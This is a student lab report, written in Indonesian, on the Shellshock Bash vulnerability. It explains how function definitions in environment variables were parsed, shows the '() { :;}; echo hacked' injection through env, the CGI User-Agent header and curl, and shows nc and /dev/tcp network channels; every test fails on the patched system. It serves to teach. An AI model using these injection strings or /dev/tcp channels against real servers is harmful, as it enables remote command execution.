# R3 - OS Attack

Nama: Xyz Frizy Firstyaji  
NRP: 5024221073  

---

## Tujuan

Untuk memahami Shellshock Attack serta melihat seberapa rentan sistem ketika environment variable menjalankan perintah secara tidak sah.  

Percobaan ini juga bertujuan untuk memahami bagaimana Bash memproses function yang dikirim melalui environment variable, serta mengetahui perbedaan perilaku antara sistem yang rentan (unpatched) dan yang sudah diperbaiki (patched).

---

## Implementasi

Pada percobaan ini dilakukan beberapa langkah untuk memahami cara kerja Shellshock Attack.

- Menguji apakah sistem masih rentan terhadap Shellshock  
- Melihat bagaimana environment variable diturunkan ke child process  
- Menguji apakah function dapat diwariskan ke child process  
- Menguji apakah payload tambahan dapat dieksekusi  

Hasil menunjukkan bahwa sistem tidak mengeksekusi perintah tambahan, yang berarti sistem sudah patched dan tidak rentan terhadap Shellshock.

---

### W6.1

Ketika sebuah variabel shell yang berisi definisi fungsi dikirim ke child process melalui environment variable, maka definisi fungsi tersebut akan disimpan sebagai environment variable.

Pada Bash versi lama (vulnerable), fungsi akan otomatis di-import dan bisa dijalankan pada child process.

Namun pada Bash yang sudah patched, fungsi tersebut tidak dieksekusi dan hanya dianggap sebagai string biasa.

---

### W6.2

Ketika sebuah Bash program mendefinisikan fungsi lalu di-export, maka fungsi tersebut dikirim sebagai environment variable ke child process.

Pada Bash lama, child process akan mem-parse kembali environment variable tersebut dan mengubahnya menjadi fungsi.

Pada Bash patched, hal ini tidak terjadi, sehingga fungsi tidak tersedia di child process.

---

### W6.3

Contoh eksploitasi:

```bash
env x='() { :;}; echo hacked' bash -c "echo test"
```

Output:
```bash
test
```

Jika vulnerable:
```bash
hacked
test
```

Penjelasan:
- `() { :;}` → definisi fungsi
- `echo hacked` → payload tambahan

Kesimpulan: Shellshock = function + command injection

---

### W6.4

```bash
export foo='echo world; () { echo hello;}'
```

Perintah `echo world` tidak akan dieksekusi karena tidak diawali definisi fungsi.

Bash hanya mengenali format yang dimulai dengan:
```bash
() { ... }
```

---

### W6.5

Syarat eksploitasi Shellshock:

1. Bash masih vulnerable  
2. Input user masuk ke environment variable  

Keduanya HARUS terpenuhi.

---

### W6.6

Alur CGI:

```
User → HTTP → Web Server → Environment Variable → Bash
```

Contoh:
```
User-Agent: () { :;}; echo hacked
```

Menjadi:
```
HTTP_USER_AGENT="() { :;}; echo hacked"
```

Jika vulnerable → `echo hacked` dieksekusi.

---

### W6.7

Tidak bisa langsung menjalankan command tanpa format fungsi.

Harus:
```
() { :;}; command
```

Tanpa itu → tidak dieksekusi.

---

### W6.8

Kesalahan terjadi karena Bash mengizinkan function diwariskan via environment variable, namun parsing tidak aman.

Pelajaran:
- fitur = kemudahan  
- bug = konsekuensi  
- security > kemudahan  

---

### W6.9

Payload bisa dimasukkan via URL:

```
?name=() { :;}; echo hacked
```

Namun hanya berhasil jika:
- Bash vulnerable  
- input masuk ke environment variable  

---

### W6.10

Machine 1:
```bash
nc -l 7070
```

Machine 2:
```bash
/bin/cat < /dev/tcp/10.0.2.6/7070 >&0
```

Terjadi komunikasi dua arah.

---

### W6.11

Simulasi 3 machine:

Terminal 1:
```bash
nc -l 7071
```

Terminal 2:
```bash
nc -l 7070 | /bin/cat | nc localhost 7071
```

Terminal 3:
```bash
echo "halo dari machine 2" | nc localhost 7070
```

Hasil:
```bash
halo dari machine 2
```

Alur:
```
Machine 2 → Machine 1 → Machine 3
```

---

### W6.12

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

extern char **environ;

int main()
{
    char *args[] =
    {
        "/bin/sh", "-c",
        "/bin/ls", NULL
    };

    pid_t pid = fork();

    if(pid == 0) {
        printf("child\n");
        execve(args[0], &args[0], NULL);
    }
    else if(pid > 0) {
        printf("parent\n");
    }

    return 0;
}
```

Run:

```bash
gcc prog.c -o prog
export foo='() { echo hello; }; echo world;'
./prog
```

Output:
```bash
parent
child
<list file>
```

Tidak muncul `hello` atau `world`.

Karena `execve(..., NULL)` → environment tidak diteruskan.

---

### W6.13

Perubahan:
```c
execve(args[0], &args[0], environ);
```

Output tetap sama.

Artinya:
- environment sudah diteruskan  
- tapi Bash sudah patched → tidak execute payload  

---

### W6.14

Perbandingan:

CGI:
```
HTTP → env → Bash
```

PHP:
```
HTTP → PHP → system() → shell
```

CGI lebih rentan karena env langsung ke Bash.

---

#### Setup CGI

```bash
mkdir ~/shellshock-test
cd ~/shellshock-test
```

File `test.cgi`:

```bash
#!/bin/bash

echo "Content-type: text/plain"
echo ""

echo "User-Agent: $HTTP_USER_AGENT"
```

Run server:

```bash
python3 -m http.server --cgi 8000
```

Test:

```bash
curl -A "normal" http://localhost:8000/cgi-bin/test.cgi
curl -A "() { :;}; echo hacked" http://localhost:8000/cgi-bin/test.cgi
```

Output:
```bash
User-Agent: () { :;}; echo hacked
```

Tidak ada eksekusi → sistem patched.

---

## Kesimpulan

Shellshock hanya dapat dieksploitasi jika:
- Bash masih vulnerable  
- input masuk ke environment variable  

Pada percobaan ini, sistem sudah patched sehingga semua payload tidak dieksekusi.
